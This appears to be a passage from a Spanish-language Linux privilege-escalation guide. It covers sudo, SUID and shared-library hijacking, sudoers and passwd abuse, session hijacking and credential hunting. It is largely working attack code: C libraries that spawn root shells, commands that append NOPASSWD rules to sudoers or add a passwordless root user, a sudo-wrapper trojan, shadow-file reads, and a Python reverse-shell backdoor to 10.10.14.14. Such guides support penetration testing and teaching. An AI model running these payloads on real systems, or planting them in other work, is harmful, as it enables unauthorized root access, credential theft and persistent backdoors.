Finalmente, ejecutando **escalate privileges**
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Se puede abusar de un privesc similar si el atacante controla la variable de entorno **LD_LIBRARY_PATH**, ya que controla la ruta en la que se buscarán las librerías.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Al encontrar un binario con permisos **SUID** que parece inusual, es una buena práctica verificar si está cargando correctamente archivos **.so**. Esto se puede comprobar ejecutando el siguiente comando:<sup>[[17]](#references)</sup>
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Por ejemplo, encontrarse con un error como _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ sugiere un posible vector de explotación.

Para explotarlo, se procedería creando un archivo C, por ejemplo _"/path/to/.config/libcalc.c"_, que contenga el siguiente código:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Este código, una vez compilado y ejecutado, tiene como objetivo elevar privilegios manipulando los permisos de los archivos y ejecutando un shell con privilegios elevados.

Compila el archivo C anterior en un archivo de objeto compartido (.so) con:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Finalmente, ejecutar el binario SUID afectado debería activar el exploit, permitiendo un posible compromiso del sistema.

## Secuestro de objetos compartidos
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Ahora que hemos encontrado un binario SUID que carga una biblioteca desde una carpeta en la que podemos escribir, creemos la biblioteca en esa carpeta con el nombre necesario:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Si recibes un error como
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
eso significa que la library que has generado debe tener una función llamada `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) es una lista seleccionada de binarios de Unix que un atacante puede explotar para eludir las restricciones de seguridad locales. [**GTFOArgs**](https://gtfoargs.github.io/) es lo mismo, pero para casos en los que **solo puedes inyectar argumentos** en un comando.

El proyecto recopila funciones legítimas de binarios de Unix que pueden abusarse para escapar de restricted shells, escalar o mantener privilegios elevados, transferir archivos, generar bind y reverse shells y facilitar otras tareas de post-explotación.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Si puedes acceder a `sudo -l`, puedes usar la herramienta [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) para comprobar si encuentra cómo explotar alguna regla de sudo.

### Reutilización de tokens de Sudo

En casos en los que tienes **acceso a sudo**, pero no la contraseña, puedes escalar privilegios **esperando a que se ejecute un comando sudo y secuestrando después el token de sesión**.<sup>[[18]](#references)</sup>

Requisitos para escalar privilegios:

- Ya tienes una shell como el usuario "_sampleuser_"
- "_sampleuser_" ha **usado `sudo`** para ejecutar algo en los **últimos 15 minutos** (de forma predeterminada, esa es la duración del token de sudo que nos permite usar `sudo` sin introducir ninguna contraseña)
- `cat /proc/sys/kernel/yama/ptrace_scope` es 0
- `gdb` es accesible (debes poder subirlo)

(Puedes habilitar temporalmente `ptrace_scope` con `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` o modificar permanentemente `/etc/sysctl.d/10-ptrace.conf` y establecer `kernel.yama.ptrace_scope = 0`)

Si se cumplen todos estos requisitos, **puedes escalar privilegios usando:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- El **primer exploit** (`exploit.sh`) creará el binario `activate_sudo_token` en _/tmp_. Puedes usarlo para **activar el token de sudo en tu sesión** (no obtendrás automáticamente una shell de root; ejecuta `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- El **segundo exploit** (`exploit_v2.sh`) creará una shell sh en _/tmp_ **propiedad de root con setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- El **tercer exploit** (`exploit_v3.sh`) **creará un archivo sudoers** que hace que los **tokens de sudo sean eternos y permite a todos los usuarios usar sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Si tienes **permisos de escritura** en la carpeta o en cualquiera de los archivos creados dentro de ella, puedes usar el binario [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) para **crear un token de sudo para un usuario y un PID**.\
Por ejemplo, si puedes sobrescribir el archivo _/var/run/sudo/ts/sampleuser_ y tienes una shell como ese usuario con el PID 1234, puedes **obtener privilegios de sudo** sin necesidad de conocer la contraseña haciendo lo siguiente:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

El archivo `/etc/sudoers` y los archivos dentro de `/etc/sudoers.d` configuran quién puede usar `sudo` y cómo. Estos archivos **de forma predeterminada solo pueden ser leídos por el usuario root y el grupo root**.\
**Si** puedes **leer** este archivo, podrías **obtener información interesante**, y si puedes **escribir** cualquier archivo, podrás **escalar privilegios**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Si puedes escribir, puedes abusar de este permiso
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Otra forma de abusar de estos permisos:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Existen algunas alternativas al binario `sudo`, como `doas` para OpenBSD; recuerda comprobar su configuración en `/etc/doas.conf`
```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```
Si `doas` permite un editor o intérprete, comprueba escapes al estilo de GTFOBins:
```bash
doas vim
:!/bin/sh
```
### Sudo Hijacking

Si sabes que un **usuario normalmente se conecta a una máquina y usa `sudo`** para escalar privilegios y has obtenido una shell dentro del contexto de dicho usuario, puedes **crear un nuevo ejecutable de sudo** que ejecute tu código como root y, después, el comando del usuario. Luego, **modifica el $PATH** del contexto del usuario (por ejemplo, añadiendo la nueva ruta en .bash_profile) para que, cuando el usuario ejecute sudo, se ejecute tu ejecutable de sudo.

Ten en cuenta que, si el usuario utiliza una shell diferente (no bash), tendrás que modificar otros archivos para añadir la nueva ruta. Por ejemplo, [sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifica `~/.bashrc`, `~/.zshrc` y `~/.bash_profile`. Puedes encontrar otro ejemplo en [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

O ejecutando algo como:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Biblioteca compartida

### ld.so

El archivo `/etc/ld.so.conf` indica **de dónde proceden los archivos de configuración cargados**. Normalmente, este archivo contiene la siguiente ruta: `include /etc/ld.so.conf.d/*.conf`

Eso significa que se leerán los archivos de configuración de `/etc/ld.so.conf.d/*.conf`. Estos archivos de configuración **apuntan a otras carpetas** en las que se **buscarán** **bibliotecas**. Por ejemplo, el contenido de `/etc/ld.so.conf.d/libc.conf` es `/usr/local/lib`. **Esto significa que el sistema buscará bibliotecas dentro de `/usr/local/lib`**.

Si por alguna razón **un usuario tiene permisos de escritura** en cualquiera de las rutas indicadas: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, cualquier archivo dentro de `/etc/ld.so.conf.d/` o cualquier carpeta indicada en el archivo de configuración dentro de `/etc/ld.so.conf.d/*.conf`, es posible que pueda escalar privilegios.\
Consulta **cómo explotar esta misconfiguration** en la siguiente página:


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Al copiar la lib en `/var/tmp/flag15/`, el programa la utilizará desde esta ubicación, tal como se especifica en la variable `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Luego crea una biblioteca maliciosa en `/var/tmp` con `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Las capabilities de Linux proporcionan un **subconjunto de los privilegios de root disponibles a un proceso**. Esto divide efectivamente los **privilegios de root en unidades más pequeñas y diferenciadas**. Cada una de estas unidades puede concederse de forma independiente a los procesos. De esta manera, el conjunto completo de privilegios se reduce, disminuyendo los riesgos de explotación.\
Lee la siguiente página para **aprender más sobre las capabilities y cómo abusar de ellas**:


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Permisos de directorios

En un directorio, el **bit de "execute"** implica que el usuario afectado puede hacer "**cd**" a la carpeta.\
El bit de **"read"** implica que el usuario puede **listar** los **archivos**, y el bit de **"write"** implica que el usuario puede **eliminar** y **crear** nuevos **archivos**.

## ACLs

Las Access Control Lists (ACLs) representan la capa secundaria de permisos discrecionales, capaz de **anular los permisos ugo/rwx tradicionales**. Estos permisos mejoran el control sobre el acceso a archivos o directorios al permitir o denegar derechos a usuarios específicos que no son los propietarios ni forman parte del grupo. Este nivel de **granularidad garantiza una gestión de acceso más precisa**. Puedes encontrar más detalles [**aquí**](https://linuxconfig.org/how-to-manage-acls-on-linux).<sup>[[19]](#references)</sup>

**Concede** al usuario "kali" permisos de lectura y escritura sobre un archivo:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Obtén** archivos con ACL específicas del sistema:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### Backdoor de ACL oculta en archivos drop-in de sudoers

Una configuración incorrecta común es un archivo propiedad de root en `/etc/sudoers.d/` con permisos `440` que aún concede acceso de escritura a un usuario con pocos privilegios mediante una ACL.
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
Si ves algo como `user:alice:rw-`, el usuario puede añadir una regla de sudo a pesar de los bits de modo restrictivos:
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
Esta es una ruta de persistencia/privesc mediante ACL de alto impacto porque es fácil pasarla por alto en revisiones que solo usan `ls -l`.

## Sesiones de shell abiertas

En **versiones antiguas** puedes **hijackear** alguna sesión de **shell** de otro usuario (**root**).\
En las **versiones más recientes** solo podrás **conectarte** a sesiones de screen de tu **propio usuario**. Sin embargo, podrías encontrar **información interesante dentro de la sesión**.

### hijacking de sesiones de screen

**Listar sesiones de screen**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![secuestro de sesiones screen - Ubicaciones de sockets (algunos sistemas exponen uno como symlink del otro): ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**Conectarse a una sesión**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Esto era un problema de **versiones antiguas de tmux**. No pude secuestrar una sesión de tmux (v2.1) creada por root como usuario sin privilegios.

**Listar sesiones de tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![Ubicaciones de los sockets (algunos sistemas exponen uno como symlink del otro) - secuestro de sesiones de tmux: tmux -S /tmp/dev sess ls Lista usando ese socket; puedes iniciar una sesión de tmux en ese socket...](<../../images/image (837).png>)

**Conectarse a una sesión**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Comprueba **Valentine box from HTB** como ejemplo.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Todas las claves SSL y SSH generadas en sistemas basados en Debian (Ubuntu, Kubuntu, etc.) entre septiembre de 2006 y el 13 de mayo de 2008 pueden estar afectadas por este bug.\
Este bug se produce al crear una nueva clave ssh en esos sistemas operativos, ya que **solo eran posibles 32.768 variaciones**. Esto significa que se pueden calcular todas las posibilidades y que **teniendo la clave pública ssh se puede buscar la clave privada correspondiente**. Puedes encontrar las posibilidades calculadas aquí: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### Valores de configuración interesantes de SSH

- **PasswordAuthentication:** Especifica si se permite la autenticación mediante contraseña. El valor predeterminado es `no`.
- **PubkeyAuthentication:** Especifica si se permite la autenticación mediante clave pública. El valor predeterminado es `yes`.
- **PermitEmptyPasswords**: Cuando se permite la autenticación mediante contraseña, especifica si el servidor permite el login en cuentas con contraseñas vacías. El valor predeterminado es `no`.

### Archivos de control del login

Estos archivos influyen en quién puede hacer login y cómo:

- **`/etc/nologin`**: si existe, bloquea los logins que no sean de root y muestra su mensaje.
- **`/etc/securetty`**: restringe dónde puede hacer login root (lista de TTY permitidas).
- **`/etc/motd`**: banner posterior al login (puede hacer leak de información del entorno o de mantenimiento).

### PermitRootLogin

Especifica si root puede hacer login usando ssh; el valor predeterminado es `no`. Valores posibles:

- `yes`: root puede hacer login usando contraseña y clave privada
- `without-password` o `prohibit-password`: root solo puede hacer login con una clave privada
- `forced-commands-only`: Root solo puede hacer login usando una clave privada y si se especifican las opciones de comandos
- `no` : no

### AuthorizedKeysFile

Especifica los archivos que contienen las claves públicas que se pueden usar para la autenticación de usuarios. Puede contener tokens como `%h`, que serán reemplazados por el directorio home. **Puedes indicar rutas absolutas** (que comiencen por `/`) o **rutas relativas desde el home del usuario**. Por ejemplo:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Esa configuración indicará que, si intentas iniciar sesión con la **key privada** del usuario "**testusername**", ssh comparará la clave pública de tu key con las ubicadas en `/home/testusername/.ssh/authorized_keys` y `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

El reenvío del agente SSH te permite **usar tus keys SSH locales en lugar de dejar las keys** (¡sin passphrases!) en tu servidor. Así, podrás **saltar** mediante ssh **a un host** y desde allí **saltar a otro** host **usando** la **key** ubicada en tu **host inicial**.

Debes establecer esta opción en `$HOME/.ssh.config` de la siguiente manera:
```
Host example.com
ForwardAgent yes
```
Ten en cuenta que si `Host` es `*`, cada vez que el usuario se conecte a una máquina diferente, ese host podrá acceder a las claves (lo que supone un problema de seguridad).

El archivo `/etc/ssh_config` puede **sobrescribir estas opciones** y permitir o denegar esta configuración.\
El archivo `/etc/sshd_config` puede **permitir o denegar** el reenvío de ssh-agent con la palabra clave `AllowAgentForwarding` (el valor predeterminado es permitir).

Si encuentras que Forward Agent está configurado en un entorno, lee la siguiente página, ya que **podrías abusar de ello para escalar privilegios**:


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## Archivos interesantes

### Archivos de perfil

El archivo `/etc/profile` y los archivos de `/etc/profile.d/` son **scripts que se ejecutan cuando un usuario inicia un nuevo shell**. Por lo tanto, si puedes **escribir o modificar cualquiera de ellos, puedes escalar privilegios**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Si se encuentra algún script de perfil extraño, deberías comprobarlo en busca de **detalles sensibles**.

### Archivos Passwd/Shadow

Dependiendo del sistema operativo, los archivos `/etc/passwd` y `/etc/shadow` pueden utilizar un nombre diferente o puede existir una copia de seguridad. Por lo tanto, se recomienda **encontrarlos todos** y **comprobar si puedes leerlos** para ver **si contienen hashes**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
En algunas ocasiones, puedes encontrar **hashes de contraseñas** dentro del archivo `/etc/passwd` (o equivalente).
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### /etc/passwd escribible

Primero, genera una contraseña con uno de los siguientes comandos.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Después, añade el usuario `hacker` y añade la contraseña generada.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Por ejemplo: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Ahora puedes usar el comando `su` con `hacker:hacker`

Como alternativa, puedes usar las siguientes líneas para añadir un usuario ficticio sin contraseña.\
ADVERTENCIA: podrías degradar la seguridad actual de la máquina.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NOTA: En las plataformas BSD, `/etc/passwd` se encuentra en `/etc/pwd.db` y `/etc/master.passwd`; además, `/etc/shadow` cambia su nombre a `/etc/spwd.db`.

Debes comprobar si puedes **escribir en algunos archivos sensibles**. Por ejemplo, ¿puedes escribir en algún **archivo de configuración de un servicio**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Por ejemplo, si la máquina ejecuta un servidor **tomcat** y puedes **modificar el archivo de configuración del servicio de Tomcat dentro de /etc/systemd/,** entonces puedes modificar las líneas:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Tu backdoor se ejecutará la próxima vez que se inicie tomcat.

### Comprobar carpetas

Las siguientes carpetas pueden contener copias de seguridad o información interesante: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Probablemente no podrás leer la última, pero inténtalo)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Ubicación extraña/archivos propios
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Archivos modificados en los últimos minutos
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Archivos de bases de datos Sqlite
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml archivos
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Archivos ocultos
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Scripts/Binaries en PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Archivos web**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Copias de seguridad**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Archivos conocidos que contienen contraseñas

Lee el código de [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), ya que busca **varios archivos posibles que podrían contener contraseñas**.\
**Otra herramienta interesante** que puedes usar para hacerlo es: [**LaZagne**](https://github.com/AlessandroZ/LaZagne), una aplicación open source utilizada para recuperar muchas contraseñas almacenadas en un equipo local con Windows, Linux y Mac.

### Registros

Si puedes leer registros, es posible que encuentres **información interesante/confidencial dentro de ellos**. Cuanto más extraño sea el registro, más interesante será (probablemente).\
Además, algunos **registros de auditoría** configurados de forma "**deficiente**" (¿backdoored?) pueden permitirte **registrar contraseñas** dentro de los registros de auditoría, tal como se explica en esta publicación: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).<sup>[[36]](#references)</sup>
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Para **leer los logs, el grupo** [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) será realmente útil.

### Archivos de shell
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

También deberías buscar archivos que contengan la palabra "**password**" en su **nombre** o dentro de su **contenido**, así como buscar IPs y emails dentro de los logs, o expresiones regulares de hashes.\
No voy a enumerar aquí cómo hacer todo esto, pero si te interesa puedes revisar las últimas comprobaciones que realiza [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Archivos escribibles

### Python library hijacking

Si sabes **desde dónde** se va a ejecutar un script de Python y **puedes escribir dentro** de esa carpeta o **puedes modificar librerías de Python**, puedes modificar la librería del sistema y hacerle backdoor (si puedes escribir en el lugar desde el que se va a ejecutar el script de Python, copia y pega la librería os.py).

Para **hacerle backdoor a la librería**, solo tienes que añadir al final de la librería os.py la siguiente línea (cambia la IP y el PUERTO):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Explotación de logrotate

Una vulnerabilidad en `logrotate` permite que los usuarios con **permisos de escritura** sobre un archivo de registro o sus directorios principales puedan obtener potencialmente privilegios elevados. Esto se debe a que `logrotate`, que a menudo se ejecuta como **root**, puede manipularse para ejecutar archivos arbitrarios, especialmente en directorios como _**/etc/bash_completion.d/**_. Es importante comprobar los permisos no solo en _/var/log_, sino también en cualquier directorio donde se aplique la rotación de logs.

> [!TIP]
> Esta vulnerabilidad afecta a la versión `3.18.0` y anteriores de `logrotate`

Puede encontrarse información más detallada sobre la vulnerabilidad en esta página: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).<sup>[[37]](#references)</sup>

Puedes explotar esta vulnerabilidad con [**logrotten**](https://github.com/whotwagner/logrotten).

Esta vulnerabilidad es muy similar a [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(logs de nginx)**, así que siempre que descubras que puedes modificar logs, comprueba quién los gestiona y si puedes escalar privilegios sustituyendo los logs por symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Referencia de la vulnerabilidad:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f).<sup>[[20]](#references)</sup>

Si, por cualquier motivo, un usuario puede **escribir** un script `ifcf-<whatever>` en _/etc/sysconfig/network-scripts_ **o** puede **modificar** uno existente, entonces tu **system is pwned**.<sup>[[20]](#references)</sup>

Los scripts de red, como _ifcg-eth0_, se utilizan para las conexiones de red. Tienen exactamente el mismo aspecto que los archivos .INI. Sin embargo, Network Manager (dispatcher.d) los ~sources~ en Linux.

En mi caso, el atributo `NAME=` de estos scripts de red no se gestiona correctamente. Si hay **espacios en blanco en el nombre, el sistema intenta ejecutar la parte posterior al espacio en blanco**. Esto significa que **todo lo que aparece después del primer espacio en blanco se ejecuta como root**.

Por ejemplo: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Ten en cuenta el espacio en blanco entre Network y /bin/id_)

### **init, init.d, systemd y rc.d**

El directorio `/etc/init.d` contiene **scripts** para System V init (SysVinit), el **sistema clásico de gestión de servicios de Linux**. Incluye scripts para `start`, `stop`, `restart` y, en ocasiones, `reload` de servicios. Estos pueden ejecutarse directamente o mediante enlaces simbólicos ubicados en `/etc/rc?.d/`. Una ruta alternativa en sistemas Redhat es `/etc/rc.d/init.d`.

Por otro lado, `/etc/init` está asociado con **Upstart**, un **sistema de gestión de servicios** más reciente introducido por Ubuntu, que utiliza archivos de configuración para las tareas de gestión de servicios. A pesar de la transición a Upstart, los scripts de SysVinit todavía se utilizan junto con las configuraciones de Upstart debido a una capa de compatibilidad en Upstart.

**systemd** surge como un gestor moderno de inicialización y servicios, que ofrece funciones avanzadas como el inicio de daemons bajo demanda, la gestión de automount y las instantáneas del estado del sistema. Organiza los archivos en `/usr/lib/systemd/` para los paquetes de la distribución y en `/etc/systemd/system/` para las modificaciones de los administradores, simplificando el proceso de administración del sistema.<sup>[[21]](#references)</sup>

## Other Tricks

### Escalada de privilegios mediante NFS


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escape de Restricted Shells


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../network-information/cisco-vmanage.md
{{#endref}}

## Frameworks de rooting de Android: abuso del canal del manager

Los frameworks de rooting de Android suelen enganchar un syscall para exponer funcionalidades privilegiadas del kernel a un manager en userspace. Una autenticación débil del manager (por ejemplo, comprobaciones de firma basadas en el orden de los FD o esquemas de contraseñas deficientes) puede permitir que una app local suplante al manager y escale a root en dispositivos que ya tienen root. Obtén más información y consulta los detalles de explotación aquí:


{{#ref}}
../../software-information/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## LPE de descubrimiento del servicio VMware Tools (CWE-426) mediante exec basado en regex (CVE-2025-41244)

